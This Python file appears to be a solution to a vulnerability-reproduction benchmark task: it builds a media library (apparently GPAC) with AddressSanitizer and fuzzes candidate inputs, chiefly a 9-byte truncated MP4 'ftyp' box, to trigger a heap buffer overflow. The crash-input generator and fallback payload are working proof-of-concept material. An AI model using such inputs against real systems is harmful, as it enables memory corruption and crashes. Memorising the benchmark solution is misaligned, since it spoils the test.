import os
import sys
import tarfile
import tempfile
import subprocess
import shutil
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        
        try:
            # Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                pass
            
            # Locate source root
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if 'configure' in files:
                    src_root = root
                    break
            
            # Environment variables for AddressSanitizer
            env = os.environ.copy()
            cflags = "-g -fsanitize=address"
            env['CFLAGS'] = cflags
            env['CXXFLAGS'] = cflags
            env['LDFLAGS'] = cflags
            
            # Configure and Build
            # Minimal config to ensure dash_client builds without external deps issues
            config_args = [
                './configure',
                '--disable-ssl',
                '--use-zlib=no',
                '--disable-x11',
                '--disable-sdl',
                '--disable-oss-audio',
                '--disable-pulseaudio',
                '--static-bin'
            ]
            
            try:
                subprocess.run(config_args, cwd=src_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Ensure ASAN flags are respected
                config_mak = os.path.join(src_root, 'config.mak')
                if os.path.exists(config_mak):
                    with open(config_mak, 'a') as f:
                        f.write(f"\nCFLAGS+={cflags}\nCXXFLAGS+={cflags}\nLDFLAGS+={cflags}\n")
                
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
            
            # Locate compiled binary
            target_bin = None
            possible_names = ['dash_client', 'MP4Client', 'gpac']
            for root, dirs, files in os.walk(src_root):
                for name in possible_names:
                    if name in files:
                        path = os.path.join(root, name)
                        if os.access(path, os.X_OK):
                            target_bin = path
                            break
                if target_bin:
                    break
            
            # Generate Candidates
            # Vulnerability is Heap Buffer Overflow, ground truth 9 bytes.
            # Likely a truncated MP4 box where header is 8 bytes and payload is 1 byte,
            # causing a read overflow when parser expects more (e.g. 4 bytes for major brand).
            candidates = []
            
            # 1. Truncated Box: Size(4) + Type(4) + Data(1) = 9 bytes
            box_types = [b'ftyp', b'moov', b'moof', b'mdat', b'styp', b'free', b'skip']
            for t in box_types:
                candidates.append(struct.pack('>I', 9) + t + b'\x00')
            
            # 2. String/Protocol patterns
            candidates.append(b'file:///A')
            candidates.append(b'http://AB')
            candidates.append(b'dash://A')
            
            # 3. Simple overflow patterns
            candidates.append(b'A' * 9)
            
            # Verify candidates if binary exists
            if target_bin:
                for cand in candidates:
                    with tempfile.NamedTemporaryFile(mode='wb', delete=False) as tf:
                        tf.write(cand)
                        tf_name = tf.name
                    
                    try:
                        # Run binary with ASAN
                        res = subprocess.run([target_bin, tf_name], 
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.PIPE, 
                                             timeout=1)
                        
                        # Check for ASAN crash
                        if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                            os.unlink(tf_name)
                            return cand
                    except subprocess.TimeoutExpired:
                        pass
                    finally:
                        if os.path.exists(tf_name):
                            os.unlink(tf_name)
                            
            # Fallback: Truncated 'ftyp' box (High probability for 9-byte heap overflow in GPAC)
            return struct.pack('>I', 9) + b'ftyp' + b'\x00'

        finally:
            try:
                shutil.rmtree(work_dir)
            except Exception:
                pass